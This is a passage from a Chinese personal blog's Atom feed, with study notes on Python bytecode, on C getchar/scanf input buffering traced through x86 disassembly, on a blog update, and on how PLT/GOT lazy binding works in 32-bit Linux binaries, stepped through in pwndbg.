title="全局变量"></a>全局变量</h3><blockquote><p>LOAD_GLOBAL用来加载全局变量，包括指定函数名，类名，模块名等全局符号。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="number">101</span>)</span><br><span class="line">            <span class="number">9</span> STORE_GLOBAL             <span class="number">0</span> (global1)</span><br><span class="line">            <span class="number">20</span> LOAD_GLOBAL              <span class="number">0</span> (global1)</span><br><span class="line">            <span class="number">23</span> PRINT_ITEM</span><br></pre></td></tr></table></figure><p>对应的python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> global1</span><br><span class="line">    global1 = <span class="number">101</span></span><br><span class="line">    <span class="keyword">print</span> global1</span><br></pre></td></tr></table></figure><h3 id="常用数据类型"><a href="#常用数据类型" class="headerlink" title="常用数据类型"></a>常用数据类型</h3><blockquote><p>BUILD_LIST用于创建一个list结构。</p></blockquote><p>如果是用列表推导式呢？</p><blockquote><p>BUILD_MAP用于创建一个空的dict。STORE_MAP用于初始化dict的内容。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'a'</span>)</span><br><span class="line">              <span class="number">3</span> LOAD_CONST               <span class="number">2</span> (<span class="string">'1'</span>)</span><br><span class="line">              <span class="number">6</span> BUILD_MAP                <span class="number">1</span></span><br><span class="line">              <span class="number">9</span> STORE_FAST               <span class="number">0</span> (k)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">             <span class="number">15</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/45101508" target="_blank" rel="noopener">死磕python字节码-手工还原python源码</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fluent-python-reading-notes&quot;&gt;&lt;a href=&quot;#fluent-python-reading-notes&quot; class=&quot;headerlink&quot; title=&quot;fluent python reading notes&quot;&gt;&lt;/a&gt;fluen
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
      <category term="python字节码" scheme="https://prontosil.club/tags/python%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    
      <category term="tricks" scheme="https://prontosil.club/tags/tricks/"/>
    
  </entry>
  
  <entry>
    <title>C语言缓冲区</title>
    <link href="https://prontosil.club/2019/07/30/C%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    <id>https://prontosil.club/2019/07/30/C语言缓冲区/</id>
    <published>2019-07-30T14:47:28.000Z</published>
    <updated>2019-07-30T14:48:50.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="调试一下c语言程序"><a href="#调试一下c语言程序" class="headerlink" title="调试一下c语言程序"></a>调试一下c语言程序</h1><p>自我感觉很久没写C语言了</p><h2 id="getchar函数"><a href="#getchar函数" class="headerlink" title="getchar函数"></a>getchar函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">char</span> a = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a is %c\n"</span>, a);</span><br><span class="line"><span class="keyword">char</span> b = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b is %c\n"</span>, b);</span><br><span class="line"><span class="keyword">char</span> c = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c is %c\n"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>getchar函数是依次从缓冲区中取出字符来，会取走的！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nihao</span><br><span class="line">a is n</span><br><span class="line">b is i</span><br><span class="line">c is h</span><br></pre></td></tr></table></figure><p>这一行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nums[i]) != <span class="number">0</span> &amp;&amp; getchar() == <span class="string">' '</span>; ++i)</span><br><span class="line">nums = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(nums, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (i + <span class="number">1</span>)); <span class="comment">//数组为非降序排列</span></span><br></pre></td></tr></table></figure></p><p>这里会要求用户输入数据，用户输入的数据就是会存放在缓冲区内，然后之后scanf每次读一个数字，getchar紧随其后读一个字符，所以我们输入的时候必须是一个数字一个空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);</span><br></pre></td></tr></table></figure><p>之后把缓冲区的字符读干净</p><p>测试一下，如果我输入<code>12 21\n</code></p><p>那么scanf读完21之后，getchar函数读<code>\n</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00D52466  je          main+0DEh (0D524AEh)  </span><br><span class="line">00D52468  mov         esi,esp  </span><br><span class="line">00D5246A  call        dword ptr [__imp__getchar (0D5F220h)]   ;函数返回值存放在eax中，十进制10，代表LF</span><br><span class="line">00D52470  cmp         esi,esp  </span><br><span class="line">00D52472  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D52477  cmp         eax,20h  </span><br><span class="line">00D5247A  jne         main+0DEh (0D524AEh)</span><br></pre></td></tr></table></figure><p>关键是这两条指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00D52472  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D52477  cmp         eax,20h</span><br></pre></td></tr></table></figure><p>所以之后比较<code>cmp eax 20h</code>就会跳出循环</p><p>之后进入那个while循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);</span><br><span class="line">00D524AE  mov         esi,esp  </span><br><span class="line">00D524B0  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524B6  cmp         esi,esp  </span><br><span class="line">00D524B8  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524BD  cmp         eax,0Ah  </span><br><span class="line">00D524C0  je          main+119h (0D524E9h)</span><br></pre></td></tr></table></figure><p>此时缓冲区已经是空的了，所以会要求用户继续输入数据<br>我此时输入了 <code>1\n</code><br>所以调用完<code>getchar</code>函数之后eax存放了十六进制的49</p><p>那么第二个调用<code>getchar</code>读取的结果就是<code>0Ah</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00D524C2  mov         esi,esp  </span><br><span class="line">00D524C4  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524CA  cmp         esi,esp  </span><br><span class="line">00D524CC  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524D1  cmp         eax,0FFFFFFFFh</span><br></pre></td></tr></table></figure><p>继续。此时缓冲区已经空了</p><p>那么会要求用户继续输入<br>我又输入了一个换行符，很明显此时读取的结果非空，所以跳出while循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00D524D8  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524DE  cmp         esi,esp  </span><br><span class="line">00D524E0  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524E5  test        eax,eax   ;检查eax是否为空</span><br><span class="line">00D524E7  jne         main+11Bh (0D524EBh)  </span><br><span class="line">00D524E9  jmp         main+0DEh (0D524AEh)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/YrxXMwq.png" alt="eax"></p><h2 id="遇到的尴尬"><a href="#遇到的尴尬" class="headerlink" title="遇到的尴尬"></a>遇到的尴尬</h2><p>如果要程序的健壮性，那么用户多输入一个空格就会出错，因为多输入一个空格程序就不知道后面那个是什么了，同时还涉及到<code>getchar</code>函数清空缓冲区，那个while循环的写法确实很经典，但是就没有考虑过如果缓冲区本身就是空的呢？</p><p>我修改了一下原有的代码，加入了<code>cin.peek</code>函数来帮助判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">nums = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(nums, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (i + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nums[i]);</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">char</span> ch = getchar();</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">' '</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isdigit</span>(<span class="built_in">cin</span>.peek()))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">'\n'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//    for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        nums = (int *)realloc(nums, sizeof(int)*(i+1));</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;调试一下c语言程序&quot;&gt;&lt;a href=&quot;#调试一下c语言程序&quot; class=&quot;headerlink&quot; title=&quot;调试一下c语言程序&quot;&gt;&lt;/a&gt;调试一下c语言程序&lt;/h1&gt;&lt;p&gt;自我感觉很久没写C语言了&lt;/p&gt;
&lt;h2 id=&quot;getchar函数&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="缓冲区" scheme="https://prontosil.club/tags/%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    
      <category term="getchar" scheme="https://prontosil.club/tags/getchar/"/>
    
      <category term="x86" scheme="https://prontosil.club/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>blog 更新小记</title>
    <link href="https://prontosil.club/2019/07/30/blog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/30/blog-更新小记/</id>
    <published>2019-07-30T14:37:09.000Z</published>
    <updated>2019-07-30T14:59:41.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>简单地更新了一下自己的blog，虽然是这么说，但是实际上还是花了不少时间来完善，主要有：</p><ul><li>修改了代码的高亮格式，黑色的主题更好看一些</li><li>更换了blog的markdown引擎，可以渲染emoj了</li><li>修改了自我介绍，去掉了网易云音乐的外链，因为失效了，同时添加了简书和知乎链接</li><li>添加了友链</li><li>添加了评论gitment</li></ul><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a><em>TODO</em></h2><p>搜索功能没有没法用</p><p>blog还可以更美化一点</p><h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><p>喜欢自己搭建的这个小天地，虽然有这么或者那么的不完善，但是这个blog见证着我的成长！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;更新&quot;&gt;&lt;a href=&quot;#更新&quot; class=&quot;headerlink&quot; title=&quot;更新&quot;&gt;&lt;/a&gt;更新&lt;/h2&gt;&lt;p&gt;简单地更新了一下自己的blog，虽然是这么说，但是实际上还是花了不少时间来完善，主要有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改了代码的高亮格式，黑
      
    
    </summary>
    
      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="blog" scheme="https://prontosil.club/tags/blog/"/>
    
      <category term="hexo" scheme="https://prontosil.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>聊聊plt与got</title>
    <link href="https://prontosil.club/2019/07/24/%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot/"/>
    <id>https://prontosil.club/2019/07/24/聊聊plt与got/</id>
    <published>2019-07-24T12:46:14.000Z</published>
    <updated>2019-07-24T12:50:39.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入理解plt和got"><a href="#深入理解plt和got" class="headerlink" title="深入理解plt和got"></a>深入理解plt和got</h1><p>先写一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Build with: gcc -m32 --no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>途中遇到了一个报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In file included from /usr/include/stdio.h:27:0,</span><br><span class="line">                 from plt.c:3:</span><br><span class="line">/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory</span><br><span class="line"> #  include &lt;sys/cdefs.h&gt;</span><br></pre></td></tr></table></figure></p><p>然后安装一个:<br><code>apt install libc6-dev-i386</code></p><p>编译好程序之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec plt     </span><br><span class="line">[*] &apos;/home/pxy/pwnable/plt&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序是没有pie的</p><p><code>readelf -S plt</code>查看节表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[12] .plt              PROGBITS        08048300 000300 000050 04  AX  0   0 16</span><br><span class="line">[13] .text             PROGBITS        08048350 000350 000192 00  AX  0   0 16</span><br><span class="line">[22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">[23] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br></pre></td></tr></table></figure><p>可以看到：</p><ul><li>.plt 基地址为： <code>0x08048300</code></li><li>.got 基地址为： <code>0x08049ffc</code></li><li>.got.plt 基地址为： <code>0x0x804a000</code></li></ul><p>我们从调用puts函数那里开始单步执行</p><p>首先跳转到plt表中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x804845d &lt;main+16&gt;               call   puts@plt &lt;0x8048310&gt;</span><br><span class="line">0x8048310  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804a00c&gt;</span><br></pre></td></tr></table></figure></p><p>call puts之后，下一条指令也是一个跳转</p><p><code>jmp    dword ptr [puts@got.plt] &lt;0x804a00c&gt;</code><br>这条指令的意思是取出<code>puts@got.plt</code>表中的值，放到pc寄存器中</p><p>所以？查看一下此处内存的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2x 0x804a00c</span><br><span class="line">0x804a00c &lt;puts@got.plt&gt;:0x080483160x08048326</span><br></pre></td></tr></table></figure><p>所以下一条指令的地址就是<code>0x08048316</code>还是在plt表中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048316  &lt;puts@plt+6&gt;                push   0</span><br><span class="line">  0x804831b  &lt;puts@plt+11&gt;               jmp    0x8048300</span><br></pre></td></tr></table></figure><p>这里先将0放到栈上，表明是要解析puts函数的地址，然后再跳转到<code>0x8048300</code>也就是plt表的开始部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048300                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">  0x8048306                              jmp    dword ptr [0x804a008] &lt;0xf7ff0650&gt;</span><br></pre></td></tr></table></figure><p>这时候先把.got.plt表中的第二项放到栈上<br>先查看一下.got.plt中前三项的内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3x 0x804a000</span><br><span class="line">0x804a000:0x08049f140xf7ffd9380xf7ff0650</span><br></pre></td></tr></table></figure><p>将<code>0xf7ffd938</code>放置到栈上，然后跳转到.got.plt中的第三项，也就是<br><code>0xf7ff0650</code>，这个地址就是<code>_dl_runtime_resolve</code>函数的地址<br>负责解析函数的地址</p><p>此时我们的got表内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 4</span><br><span class="line"></span><br><span class="line">[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) ◂— push   0 /* &apos;h&apos; */</span><br><span class="line">[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push   8</span><br><span class="line">[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push   0x10</span><br><span class="line">[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push   ebp</span><br></pre></td></tr></table></figure><p>puts函数的地址还没有重定位</p><p>当我们执行过一遍puts函数之后<br>这时候回过头来继续查看got表中的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 4</span><br><span class="line"></span><br><span class="line">[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push   ebp</span><br><span class="line">[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push   8</span><br><span class="line">[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push   0x10</span><br><span class="line">[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push   ebp</span><br></pre></td></tr></table></figure><p>可以看到地址已经重定位好了</p><p>这和Windows的PE文件格式似乎有点不同了，PE文件是装载进内存之后函数地址都已经重定位好了，而Linux的elf文件刚刚装进内存之后函数的地址还是不确定的，需要在运行的时候进行重定位。</p><p>当我们将代码修改为如下时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; l <span class="number">1</span>, <span class="number">20</span></span><br><span class="line"><span class="comment">// Build with: gcc -m32 -no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hello world again !!!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次调用<code>puts</code>函数之后：<br><code>[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push   ebp</code></p><p>puts函数地址已经重定位好了</p><p>接下来再次调用puts函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048310  &lt;puts@plt&gt;    jmp    dword ptr [0x804a00c] &lt;0xf7e727e0&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0xf7e727e0 &lt;puts&gt;        push   ebp</span><br><span class="line">  0xf7e727e1 &lt;puts+1&gt;      push   edi</span><br><span class="line">  0xf7e727e2 &lt;puts+2&gt;      push   esi</span><br><span class="line">  0xf7e727e3 &lt;puts+3&gt;      push   ebx</span><br></pre></td></tr></table></figure><p>此时可以看到直接就跳到函数的地址了<br>因为此时的.got.plt已经是puts函数的地址了， Linux tql</p><h1 id="整理一下"><a href="#整理一下" class="headerlink" title="整理一下"></a>整理一下</h1><p>之前看参考资料中博主的文章一直没有很理解，这里直接统一说一下我的理解：</p><h2 id="何谓PLT与GOT"><a href="#何谓PLT与GOT" class="headerlink" title="何谓PLT与GOT"></a>何谓PLT与GOT</h2><p>其实这里准确的来说应该叫got.plt而不是叫got，不过为了方便我们还是叫它got表吧</p><p><img src="/assets/got0_bmqvjb601" alt="got0"><br>要注意那个<code>jmp *printf@got</code> *号是取出地址处的值，并不是跳到got表中去</p><h2 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h2><p>这篇文章我觉得写的很精彩</p><p>Linux为了缩减代码,就是按照这种模式来的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// 链接器将printf@got填成下一语句lookup_printf的地址</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        调用重定位函数查找<span class="built_in">printf</span>地址，并写到<span class="built_in">printf</span>@got</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就和上面那张图是一一对应的</p><h2 id="公共got表项"><a href="#公共got表项" class="headerlink" title="公共got表项"></a>公共got表项</h2><p>在解析函数的真正地址时， <code>_dl_runtime_resolve</code>是怎么知道它要解析哪个函数的</p><p>因为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf@plt&gt;:</span><br><span class="line">   jmp *0x80496f8</span><br><span class="line">   push $0x00</span><br><span class="line">   jmp common@plt</span><br></pre></td></tr></table></figure><p>这里push的值不一样，相当于就是每个函数取了一个id</p><p>之后就是公共got表的内容：</p><ul><li>got[0]: 本ELF动态段(.dynamic段）的装载地址</li><li>got[1]：本ELF的link_map数据结构描述符地址</li><li>got[2]：_dl_runtime_resolve函数的地址</li></ul><h2 id="穿针引线"><a href="#穿针引线" class="headerlink" title="穿针引线"></a>穿针引线</h2><p><img src="/assets/got1_8tzb6jmh9" alt="got1"></p><blockquote><p>PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）每项PLT都从对应的GOT表项中读取目标函数地址</p><p>GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/linyt/article/details/51635768?from=singlemessage" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a href="https://blog.csdn.net/linyt/article/details/51636753" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位</a><br><a href="https://blog.csdn.net/linyt/article/details/51637832" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项</a><br><a href="https://blog.csdn.net/linyt/article/details/51893258" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线</a><br><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noopener">GOT and PLT for pwning.</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;深入理解plt和got&quot;&gt;&lt;a href=&quot;#深入理解plt和got&quot; class=&quot;headerlink&quot; title=&quot;深入理解plt和got&quot;&gt;&lt;/a&gt;深入理解plt和got&lt;/h1&gt;&lt;p&gt;先写一段代码：&lt;/p&gt;
&lt;figure class=&quot;highlig
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable</title>
